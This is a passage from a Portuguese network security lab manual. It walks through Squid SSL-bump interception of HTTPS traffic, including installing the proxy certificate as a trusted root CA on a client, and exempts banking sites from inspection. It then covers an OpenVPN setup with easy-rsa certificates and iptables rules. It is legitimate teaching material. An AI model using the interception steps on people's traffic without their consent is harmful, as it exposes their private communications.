https_port 8443 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB cert=/usr/local/etc/ssl/proxy.pem

coredump_dir /usr/local/var/cache/squid

refresh_pattern ^ftp:             1440  20%   10080
refresh_pattern ^gopher:          1440   0%    1440
refresh_pattern -i (/cgi-bin/|\?)    0   0%       0
refresh_pattern .                    0  20%    4320</code></pre>
</div>
</div>
<div class="paragraph">
<p>Se você for membro do grupo B, lembre-se de alterar a <code>acl</code> <code>localnet</code> no arquivo de configuração acima.</p>
</div>
</li>
<li>
<p>Vamos popular o arquivo <code>/usr/local/etc/whitelist.txt</code> com alguns domínios que não serão inspecionados. Em geral, bancos e outras informações sigilosas são bons exemplos de destinos que não devem sofrer <em>man-in-the-middle</em>, até mesmo pelas questões éticas levantadas por esse tipo de inspeção. Por exemplo:</p>
<div class="literalblock">
<div class="content">
<pre># cat /usr/local/etc/whitelist.txt
.bb.com.br
.bancobrasil.com.br
.bradesco
.caixa.gov.br
.itau.com.br
.santander.com.br</pre>
</div>
</div>
</li>
<li>
<p>Finalmente, será necessário introduzir algumas regras no firewall da máquina <em>FWGW1-G</em> para que o tráfego dos clientes seja automaticamente repassado ao proxy para tratamento. Além de regras usuais de FORWARD e MASQUERADE para permitir acesso internet através de NAT, será necessário inserir as seguintes regras:</p>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -A PREROUTING -i enp0s9 -p tcp -m tcp --dport 80 -j REDIRECT --to-port 8080
# iptables -t nat -A PREROUTING -i enp0s9 -p tcp -m tcp --dport 443 -j REDIRECT --to-port 8443
# iptables -A INPUT -s 10.1.1.0/24 -p tcp -m tcp -m multiport --dports 8080,8443 -j ACCEPT</pre>
</div>
</div>
<div class="paragraph">
<p>Com as regras acima, todo tráfego com destino à porta 80 saindo do firewall será redirecionado para <code>localhost:8080</code>, e então tratado pelo Squid. O mesmo vale para o tráfego da porta 443, que será redirecionado para <code>localhost:8443</code>. Enfim, é necessário permitir aos clientes conectar-se diretamente essas novas portas, considerando que a política padrão da chain INPUT seja DROP.</p>
</div>
</li>
<li>
<p>Concluído esses passos, inicie o Squid com o comando:</p>
<div class="literalblock">
<div class="content">
<pre># /usr/local/sbin/squid -f /usr/local/etc/squid.conf</pre>
</div>
</div>
<div class="paragraph">
<p>A partir desse momento, todo o tráfego da rede 10.1.1.0/24 será repassado ao Squid para tratamento.</p>
</div>
</li>
<li>
<p>Se você tentar navegar na internet na máquina <em>WinClient-G</em> neste momento, no entanto, irá notar que embora conexões HTTP sejam tratadas com sucesso, conexões HTTPS provavelmente irão encontrar erros na cadeia de certificação. Isso se deve ao fato de o Squid estar reescrevendo os certificados de servidor com o seu próprio, que não é reconhecido pelo cliente como válido.</p>
<div class="paragraph">
<p>Para contornar esse problema, siga os seguintes passos:</p>
</div>
<div class="openblock">
<div class="content">
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Copie o certificado <code>/usr/local/etc/ssl/public.crt</code> para a máquina <em>WinClient-G</em> (via PuTTY, WinSCP ou fazendo o download via HTTP/FTP, por exemplo).</p>
</li>
<li>
<p>Clique com o botão direito no arquivo e escolha "Instalar Certificado".</p>
</li>
<li>
<p>Clique em "Avançar".</p>
</li>
<li>
<p>Escolha "Colocar todos os certificados no repositório a seguir", e então em "Procurar&#8230;&#8203;".</p>
</li>
<li>
<p>Escolha a pasta "Autoridades de Certificação Raiz Confiáveis" e depois em "OK".</p>
</li>
<li>
<p>Clique em "Avançar", e então em "Concluir".</p>
</li>
</ol>
</div>
</div>
</div>
</li>
<li>
<p>Falta testar a configuração que fizemos. Acesse um website com HTTPS e verifique sua cadeia de certificação: o site terá sido assinado pelo proxy Squid, e não pela autoridade certificadora original. Veja, por exemplo, um acesso ao site <a href="https://twitter.com" class="bare">https://twitter.com</a> :</p>
<div id="img-squid-bump" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/squid-bump.png" alt="squid bump">
</div>
<div class="title">Figure 82. Acesso via Squid/Bump a <a href="https://twitter.com" class="bare">https://twitter.com</a></div>
</div>
<div class="paragraph">
<p>Agora, acesse um dos websites cujo domínio consta no arquivo <code>/usr/local/etc/whitelist.txt</code>, e verifique sua cadeia certificadora: a AC que assina o certificado será a original, inalterada pelo proxy. Veja abaixo um acesso a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a> :</p>
</div>
<div id="img-squid-splice" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/squid-splice.png" alt="squid splice">
</div>
<div class="title">Figure 83. Acesso via Squid/Splice a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a></div>
</div>
</li>
<li>
<p>Finalmente, retorne o ambiente de laboratório a seu estado original: pare o Squid (via <code>/usr/local/sbin/squid -k shutdown</code>) e remova as regras de firewall criadas no passo (6).</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_vpn_ssl_usando_o_openvpn">3) VPN SSL usando o OpenVPN</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>WinClient-G</em>. Esta é uma atividade a ser realizada <strong>EM DUPLA</strong>, entre membros dos grupos <strong>A</strong> e <strong>B</strong>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nesta atividade, iremos configurar um servidor e um cliente para estabelecer uma sessão VPN SSL. Para o estabelecimento dessa sessão utilizaremos o OpenVPN configurado como servidor no <em>host</em> <em>FWGW1-G</em> e o cliente instalado na máquina <em>WinClient-G</em>.</p>
</div>
<div class="paragraph">
<p>A conexão será feita entre duplas, ou seja:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Máquina <em>WinClient-A</em> irá conectar-se ao servidor <em>FWGW1-B</em> de um colega, e</p>
</li>
<li>
<p>máquina <em>WinClient-B</em> irá conectar-se ao servidor <em>FWGW1-A</em> do colega.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na máquina <em>FWGW-1-G</em>, o primeiro passo é instalar o pacote <code>openvpn</code>:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install openvpn</pre>
</div>
</div>
</li>
<li>
<p>Para gerar os certificados da autoridade certificadora (CA, ou <em>certificate authority</em>), <em>hosts</em> e usuários, vamos utilizar o conjunto de scripts <code>easy-rsa</code>, que acompanha o pacote do OpenVPN. Entre no diretório <code>/usr/share/easy-rsa</code>:</p>
<div class="literalblock">
<div class="content">
<pre># cd /usr/share/easy-rsa</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ln -s /usr/share/easy-rsa/openssl-1.0.0.cnf /usr/share/easy-rsa/openssl.cnf</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, edite o arquivo <code>/usr/share/easy-rsa/vars</code> com os dados dos campos de certificado a serem gerados. Altere os campos <code>KEY_COUNTRY</code>, <code>KEY_PROVINCE</code>, <code>KEY_CITY</code>, <code>KEY_ORG</code>, <code>KEY_EMAIL</code> e <code>KEY_OU</code> com os dados relevantes à sua organização. Por exemplo:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /usr/share/easy-rsa/vars
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep KEY_COUNTRY /usr/share/easy-rsa/vars -A5
export KEY_COUNTRY="BR"
export KEY_PROVINCE="DF"
export KEY_CITY="Brasilia"
export KEY_ORG="RNP"
export KEY_EMAIL="suporte@esr.rnp.br"
export KEY_OU="ESR"</pre>
</div>
</div>
<div class="paragraph">
<p>A seguir, importe o arquivo de variáveis <code>/usr/share/easy-rsa/vars</code> para o <em>shell</em> corrente:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># . /usr/share/easy-rsa/vars
NOTE: If you run ./clean-all, I will be doing a rm -rf on /usr/share/easy-rsa/keys</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, utilize os seguintes comandos para gerar o certificado da CA:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ./clean-all</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ./build-ca
Generating a 2048 bit RSA private key
..........+++
........+++
writing new private key to 'ca.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [BR]:
State or Province Name (full name) [DF]:
Locality Name (eg, city) [Brasilia]:
Organization Name (eg, company) [RNP]:
Organizational Unit Name (eg, section) [ESR]:
Common Name (eg, your name or your server's hostname) [RNP CA]:
Name [EasyRSA]:
Email Address [suporte@esr.rnp.br]:</pre>
</div>
</div>
<div class="paragraph">
<p>Note que todos os campos já estavam com os valores corretos, então bastou apertar ENTER em cada um deles. Se não tivéssemos editado o arquivo <code>/usr/share/easy-rsa/vars</code>, cada um desses campos teria que ser digitado individualmente.</p>
</div>
</li>
<li>
<p>Para gerar o certificado do servidor OpenVPN (a máquina <em>FWGW1-G</em>), use o seguinte comando:</p>
<div class="literalblock">
<div class="content">
<pre># ./build-key-server FWGW1-A

(...)

Country Name (2 letter code) [BR]:
State or Province Name (full name) [DF]:
Locality Name (eg, city) [Brasilia]:
Organization Name (eg, company) [RNP]:
Organizational Unit Name (eg, section) [ESR]:
Common Name (eg, your name or your server's hostname) [FWGW1-A]:
Name [EasyRSA]:
Email Address [suporte@esr.rnp.br]:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

(...)

Sign the certificate? [y/n]:y

1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
Data Base Updated</pre>
</div>
</div>
<div class="paragraph">
<p>Mantenha o campo <em>A challenge password</em> vazio. Responda <code>y</code> para as perguntas <em>Sign the certificate?</em> e <em>1 out of 1 certificate requests certified, commit?</em>.</p>
</div>
</li>
<li>
<p>Vamos agora gerar o certificado do cliente. Atente-se para o fato de que o cliente do seu servidor é na realidade a máquina <em>WinClient-G</em> do seu colega, e não a sua própria (então, membros do grupo A gerarão certificados para as máquinas <em>WinClient-B</em>, e membros do grupo B gerarão para as máquinas <em>WinClient-A</em>).</p>
<div class="literalblock">
<div class="content">
<pre># ./build-key WinClient-B

(...)

Country Name (2 letter code) [BR]:
State or Province Name (full name) [DF]:
Locality Name (eg, city) [Brasilia]:
Organization Name (eg, company) [RNP]:
Organizational Unit Name (eg, section) [ESR]:
Common Name (eg, your name or your server's hostname) [WinClient-B]:
Name [EasyRSA]:
Email Address [suporte@esr.rnp.br]:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

(...)

Sign the certificate? [y/n]:y

1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
Data Base Updated</pre>
</div>
</div>
<div class="paragraph">
<p>Assim como anteriormente, mantenha o campo <em>A challenge password</em> vazio, e responda <code>y</code> para as perguntas <em>Sign the certificate?</em> e <em>1 out of 1 certificate requests certified, commit?</em>.</p>
</div>
</li>
<li>
<p>Gere os parâmetros de troca de chaves <em>Diffie-Hellman</em> com o comando abaixo. O passo de geração pode demorar um pouco, seja paciente.</p>
<div class="literalblock">
<div class="content">
<pre># ./build-dh
Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time
(...)</pre>
</div>
</div>
</li>
<li>
<p>As chaves/certificados foram todos gerados no subdiretório <code>keys</code> da pasta corrente, <code>/usr/share/easy-rsa</code>. Copie-os para o diretório <code>/etc/openvpn/keys</code> (onde faremos a configuração do <em>daemon</em>) com os comandos que se seguem:</p>
<div class="literalblock">
<div class="content">
<pre># mkdir /etc/openvpn/keys</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cp keys/ca.crt /etc/openvpn/keys/
# cp keys/FWGW1-A.crt /etc/openvpn/keys/
# cp keys/FWGW1-A.key /etc/openvpn/keys/
# cp keys/dh2048.pem /etc/openvpn/keys/</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos fazer a configuração do OpenVPN. Crie um arquivo novo, <code>/etc/openvpn/openvpn.conf</code>, com o seguinte conteúdo:</p>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">port 1194
proto udp
dev tun

ca   /etc/openvpn/keys/ca.crt
key  /etc/openvpn/keys/FWGW1-A.key
cert /etc/openvpn/keys/FWGW1-A.crt
dh   /etc/openvpn/keys/dh2048.pem

server 10.8.1.0 255.255.255.0
ifconfig-pool-persist ipp.txt

push "route 10.1.1.0 255.255.255.0"
push "route 172.16.1.0 255.255.255.0"

keepalive 10 120
comp-lzo
auth-nocache
persist-key
persist-tun
status openvpn-status.log
verb 3

tls-version-min 1.2
tls-cipher TLS-DHE-RSA-WITH-AES-256-GCM-SHA384:TLS-DHE-RSA-WITH-AES-256-CBC-SHA256:TLS-DHE-RSA-WITH-AES-128-GCM-SHA256:TLS-DHE-RSA-WITH-AES-128-CBC-SHA256
cipher AES-256-CBC
auth SHA512
reneg-sec 60</code></pre>
</div>
</div>
<div class="paragraph">
<p>Nas linhas <code>key</code> e <code>cert</code> , substitua a letra ao final do arquivo <code>/etc/openvpn/keys/FWGW1-G</code> pela que representa seu grupo.</p>
</div>
<div class="paragraph">
<p>Note que a linha <code>server</code> indica uma <strong>NOVA</strong> rede que será criada para o túnel VPN. Nesse sentido, configura a faixa 10.8.1.0/24 se você for membro do grupo A, e 10.8.2.0/24 se você for membro do grupo B.</p>
</div>
<div class="paragraph">
<p>De igual forma, nas linhas <code>push route</code>, informe as rotas 10.1.1.0/24 e 172.16.1.0/24 se você for membro do grupo A, e 10.1.2.0/24 e 172.16.2.0/24 se você for membro do grupo B.</p>
</div>
</li>
<li>
<p>Transfira as chaves geradas no passo (4) para o cliente <strong>que irá se conectar no seu servidor</strong>. Para os membros do grupo A, isso significa transferir as chaves para a máquina <em>WinClient-B</em> do seu colega; e, para os membros do grupo B, transferi-las para a máquina <em>WinClient-A</em>. Vamos fazer isso em alguns passos simples:</p>
<div class="paragraph">
<p>Primeiro, em sua máquina <em>FWGW1-G</em>, gere um pacote <code>.tar.gz</code> com as chaves a serem transferidas.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># mkdir /tmp/vpn-keys</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cp /usr/share/easy-rsa/keys/ca.crt /tmp/vpn-keys/
# cp /usr/share/easy-rsa/keys/WinClient-B.key /tmp/vpn-keys/
# cp /usr/share/easy-rsa/keys/WinClient-B.crt /tmp/vpn-keys/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># tar czf /tmp/vpn-keys.tar.gz /tmp/vpn-keys/
tar: Removing leading `/' from member names</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># chmod a+r /tmp/vpn-keys.tar.gz</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># rm -rf /tmp/vpn-keys</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ls -ld /tmp/vpn-keys.tar.gz
-rw-r--r-- 1 root root 5525 Sep  7 09:02 /tmp/vpn-keys.tar.gz</pre>
</div>
</div>
<div class="paragraph">
<p>Como não há regra no firewall que permita conexão via SSH ou HTTP vinda de fora, vamos inserir uma regra temporária para permitir a cópia remota:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A INPUT -i enp0s3 -p tcp -m tcp --dport 22 -j ACCEPT</pre>
</div>
</div>
<div class="paragraph">
<p>Descubra o IP público da máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s enp0s3 | grep '^ *inet ' | awk '{print $2}'
192.168.29.103/24</pre>
</div>
</div>
<div class="paragraph">
<p>Copie o arquivo com as chaves do cliente usando o IP público e o comando <code>scp</code>&#8201;&#8212;&#8201;use os programas <code>pscp.exe</code>, <em>Cygwin</em> ou <em>WinSCP</em> para a tarefa. No exemplo abaixo, iremos usar o Cygwin:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>fbs@FBS-DESKTOP ~
$ scp aluno@192.168.29.103:/tmp/vpn-keys.tar.gz ~
vpn-keys.tar.gz                                                         100% 5525   705.2KB/s   00:00</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>fbs@FBS-DESKTOP ~
$ ls -ld ~/vpn-keys.tar.gz
-rw-r--r-- 1 fbs None 5525 Sep  7 10:09 /home/fbs/vpn-keys.tar.gz</pre>
</div>
</div>
<div class="paragraph">
<p>Ainda na máquina <em>FWGW1-G</em>, remova a regra de firewall temporária que criamos para a cópia remota, bem como o arquivo contendo as chaves no <code>/tmp</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -D INPUT -i enp0s3 -p tcp -m tcp --dport 22 -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># rm /tmp/vpn-keys.tar.gz</pre>
</div>
</div>
</li>
<li>
<p>Instale o OpenVPN na máquina <em>WinClient-G</em>. <strong>NÃO</strong> instale o software <em>Private Tunnel</em>, mas sim o OpenVPN <em>Open Source</em>, acessível em <a href="https://openvpn.net/index.php/open-source/downloads.html" class="bare">https://openvpn.net/index.php/open-source/downloads.html</a> . Aceite todas as opções padrão do instalador; ao ser perguntado se deseja instalar os <em>drivers</em> de rede do OpenVPN, responda afirmativamente.</p>
</li>
<li>
<p>Entre na pasta de configuração do OpenVPN no Windows, <code>C:\Program Files\OpenVPN\config</code>. Aqui, iremos fazer duas coisas: (1) criar o arquivo de configuração do OpenVPN para conexão no servidor <em>FWGW1-G</em> do seu colega de atividade, e (2) extrair as chaves do cliente copiadas no passo (8). Vamos lá:</p>
<div class="paragraph">
<p>Crie o arquivo <code>winclient-b.ovpn</code> no <em>Desktop</em> do seu usuário na máquina <em>WinClient-G</em>, com o conteúdo a seguir. Logo após, mova-o para <code>C:\Program Files\OpenVPN\config\winclient-b.ovpn</code>, concedendo permissão administrativa quando solicitado.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">client
proto udp
dev tun

ca   ca.crt
key  WinClient-B.key
cert WinClient-B.crt

remote 192.168.29.103 1194
resolv-retry infinite
nobind

keepalive 10 120
comp-lzo
auth-nocache
persist-key
persist-tun
status openvpn-status.log
verb 3

tls-version-min 1.2
tls-cipher TLS-DHE-RSA-WITH-AES-256-GCM-SHA384:TLS-DHE-RSA-WITH-AES-256-CBC-SHA256:TLS-DHE-RSA-WITH-AES-128-GCM-SHA256:TLS-DHE-RSA-WITH-AES-128-CBC-SHA256
cipher AES-256-CBC
auth SHA512
reneg-sec 60</code></pre>
</div>
</div>
<div class="paragraph">
<p>Nas linhas <code>key</code> e <code>cert</code> , substitua a letra ao final do arquivo <code>WinClient-G</code> pela que representa seu grupo.</p>
</div>
<div class="paragraph">
<p>Na linha <code>remote</code>, insira o IP público da máquina <em>FWGW1-G</em> <strong>do seu colega</strong>&#8201;&#8212;&#8201;esta será a máquina em que seu cliente VPN irá tentar conectar-se quando iniciado.</p>
</div>
<div class="paragraph">
<p>O segundo passo é extrair o arquivo <code>.tar.gz</code> contendo as chaves do cliente que foi copiado no passo (8). Use o <em>7-zip</em> (disponível em <a href="https://www.7-zip.org/download.html" class="bare">https://www.7-zip.org/download.html</a>) para fazer a extração, numa pasta em que seu usuário possua permissão (como o <em>Desktop</em>, por exemplo). Depois, mova as chaves para <code>C:\Program Files\OpenVPN\config</code>. Sua pasta deve ficar assim:</p>
</div>
<div id="img-ovpn-folder" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ovpn-folder.png" alt="ovpn folder">
</div>
<div class="title">Figure 84. Estado final da pasta do OpenVPN na máquina WinClient-G</div>
</div>
</li>
<li>
<p>Tudo quase pronto! Vamos testar o funcionamento da VPN, passo a passo: primeiro, o aluno do grupo A deverá atuar como servidor, e o aluno do grupo B atuará como cliente. A seguir, as posições serão invertidas.</p>
<div class="paragraph">
<p>No firewall do aluno do grupo A, <em>FWGW1-A</em>, crie uma regra que permita que conexões VPN sejam autorizadas através do firewall interno:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A INPUT -i enp0s3 -p udp -m udp --dport 1194 -m state --state NEW,ESTABLISHED -j ACCEPT</pre>
</div>
</div>
<div class="paragraph">
<p>Em seguida, inicie o OpenVPN e aguarde:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># /usr/sbin/openvpn --config /etc/openvpn/openvpn.conf
Fri Sep  7 10:21:24 2018 OpenVPN 2.3.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [EPOLL] [PKCS11] [MH] [IPv6] built on Jun 26 2017
Fri Sep  7 10:21:24 2018 library versions: OpenSSL 1.0.1t  3 May 2016, LZO 2.08
Fri Sep  7 10:21:24 2018 Diffie-Hellman initialized with 2048 bit key
Fri Sep  7 10:21:24 2018 Socket Buffers: R=[212992-&gt;131072] S=[212992-&gt;131072]
Fri Sep  7 10:21:24 2018 ROUTE_GATEWAY 192.168.29.1/255.255.255.0 IFACE=enp0s3 HWADDR=08:00:27:43:b1:9d
Fri Sep  7 10:21:24 2018 TUN/TAP device tun0 opened
Fri Sep  7 10:21:24 2018 TUN/TAP TX queue length set to 100
Fri Sep  7 10:21:24 2018 do_ifconfig, tt-&gt;ipv6=0, tt-&gt;did_ifconfig_ipv6_setup=0
Fri Sep  7 10:21:24 2018 /sbin/ip link set dev tun0 up mtu 1500
Fri Sep  7 10:21:24 2018 /sbin/ip addr add dev tun0 local 10.8.1.1 peer 10.8.1.2
Fri Sep  7 10:21:24 2018 /sbin/ip route add 10.8.1.0/24 via 10.8.1.2
Fri Sep  7 10:21:24 2018 UDPv4 link local (bound): [undef]
Fri Sep  7 10:21:24 2018 UDPv4 link remote: [undef]
Fri Sep  7 10:21:24 2018 MULTI: multi_init called, r=256 v=256
Fri Sep  7 10:21:24 2018 IFCONFIG POOL: base=10.8.1.4 size=62, ipv6=0
Fri Sep  7 10:21:24 2018 ifconfig_pool_read(), in='WinClient-B,10.8.1.4', TODO: IPv6
Fri Sep  7 10:21:24 2018 succeeded -&gt; ifconfig_pool_set()
Fri Sep  7 10:21:24 2018 IFCONFIG POOL LIST
Fri Sep  7 10:21:24 2018 WinClient-B,10.8.1.4
Fri Sep  7 10:21:24 2018 Initialization Sequence Completed</pre>
</div>
</div>
<div class="paragraph">
<p>Na máquina cliente do aluno do grupo B, <em>WinClient-B</em>, inicie o OpenVPN como administrador. Navegue até a pasta <code>C:\Program Files\OpenVPN\bin</code>, clique com o botão direito no executável <code>openvpn-gui.exe</code> e selecione <em>Executar como administrador</em>. Autorize a execução na janela seguinte.</p>
</div>
<div class="paragraph">
<p>Deverá aparecer um símbolo de um monitor com um cadeado no <em>tray</em> do sistema, no canto inferior direito da tela, próximo ao relógio. Clique com o botão direito nesse ícone e selecione <em>Connect</em>.</p>
</div>
<div class="paragraph">
<p>Se tudo deu certo, após alguns instantes a janela do OpenVPN que se abriu momentaneamente irá fechar, e o ícone do monitor ficará verde. Colocando o mouse em cima do ícone, você deve ver as linhas <em>Connected to: winclient-b</em> e <em>Assigned IP: 10.8.1.X</em>.</p>
</div>
</li>
<li>
<p>Vamos fazer os testes de conectividade. Na máquina <em>WinClient-B</em>, cheque se as rotas para as redes 10.1.1.0/24 e 172.16.1.0/24 foram importadas corretamente:</p>
<div class="literalblock">
<div class="content">
<pre>C:\&gt;route print
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination          Netmask          Gateway        Interface  Metric
           10.1.1.0    255.255.255.0         10.8.1.5         10.8.1.6      35
         172.16.1.0    255.255.255.0         10.8.1.5         10.8.1.6      35</pre>
</div>
</div>
<div class="paragraph">
<p>A saída do comando <code>route print</code> acima foi sumarizada para obtermos a informação relevante nesta atividade: que as rotas para as redes 10.1.1.0/24 e 172.16.1.0/24 foram adicionadas, e que ambas passam pelo <em>gateway</em> 10.8.1.5, no exemplo. Mas, que roteador é esse? O <code>ipconfig /all</code> mostra essa informação:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>C:\&gt;ipconfig /all

(...)

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : TAP-Windows Adapter V9
   Physical Address. . . . . . . . . : 00-FF-C5-80-A0-B0
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::2d85:5fb5:4550:adbf%44(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.8.1.6(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.252
   Lease Obtained. . . . . . . . . . : sexta-feira, 7 de setembro de 2018 11:21:55
   Lease Expires . . . . . . . . . . : sábado, 7 de setembro de 2019 11:21:54
   Default Gateway . . . . . . . . . :
   DHCP Server . . . . . . . . . . . : 10.8.1.5
   DHCPv6 IAID . . . . . . . . . . . : 738262981
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-21-81-69-7F-88-D7-F6-DF-94-BE
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled</pre>
</div>
</div>
<div class="paragraph">
<p>A interface de rede <code>Ethernet 2</code>, mostrada acima, é do tipo TAP e possui IP 10.8.1.6. É através dela que iremos atingir o <em>gateway</em> 10.8.1.5, e portanto as redes 10.1.1.0/24 e 172.16.1.0/24&#8201;&#8212;&#8201;essa é a interface criada pela conexão do OpenVPN.</p>
</div>
</li>
<li>
<p>Se testarmos a conectividade entre a VPN e os <em>hosts</em> da DMZ e da Intranet teremos uma surpresa ingrata, no entanto: não haverá sucesso. Antes de fazer o teste a seguir, verifique se a máquina <em>LinServer-A</em> está ligada. Feito isso, na máquina <em>WinClient-B</em>:</p>
<div class="literalblock">
<div class="content">
<pre>C:\&gt;ping 172.16.1.10

Pinging 172.16.1.10 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 172.16.1.10:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),</pre>
</div>
</div>
<div class="paragraph">
<p>Qual seria a razão? Simples: não estamos permitindo o repasse de pacotes entre as interfaces da VPN e a DMZ/Intranet. Para corrigir isso, basta adicionar uma regra à tabela FORWARD do <em>FWGW1-A</em>&#8201;&#8212;&#8201;de forma genérica, podemos permitir o repasse de qualquer interface do tipo <code>tun</code>, que é o tipo criado pelo OpenVPN quando de sua conexão, para essas duas redes.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A FORWARD -i tun+ -d 172.16.1.0/24 -j ACCEPT
# iptables -A FORWARD -i tun+ -d 10.1.1.0/24 -j ACCEPT</pre>
</div>
</div>
<div class="paragraph">
<p>Imediatamente, temos o resultado na máquina <em>WinClient-B</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>C:\&gt;ping 172.16.1.10

Pinging 172.16.1.10 with 32 bytes of data:
Reply from 172.16.1.10: bytes=32 time&lt;1ms TTL=63
Reply from 172.16.1.10: bytes=32 time&lt;1ms TTL=63
Reply from 172.16.1.10: bytes=32 time&lt;1ms TTL=63
Reply from 172.16.1.10: bytes=32 time&lt;1ms TTL=63

Ping statistics for 172.16.1.10:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms</pre>
</div>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Cuidado ao criar as regras de repasse de pacotes para as interfaces da VPN. Uma regra muito leniente, como <code>iptables -A FORWARD -i tun+ -j ACCEPT</code>, permitiria ao cliente da VPN conectar-se a qualquer <em>host</em> da Internet através do túnel&#8201;&#8212;&#8201;efetivamente utilizando a VPN como uma conexão alternativa de rede. Como raramente esse é o objetivo pretendido pelo administrador, seja específico ao dizer quais redes/máquinas poderão ser atingidas a partir da VPN.</p>
</div>
</td>
</tr>
</table>
</div>
</li>
<li>
<p>Agora, faça o caminho contrário: a máquina <em>FWGW1-B</em> será o servidor, e a máquina <em>WinClient-A</em> irá conectar-se a ela. Refaça todos os passos da atividade, e verifique que a VPN está funcionando em ambos os sentidos.</p>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_8_auditoria_de_segurança_da_informação">Sessão 8: Auditoria de segurança da informação</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_instalação_do_nessus">1) Instalação do Nessus</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina virtual <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
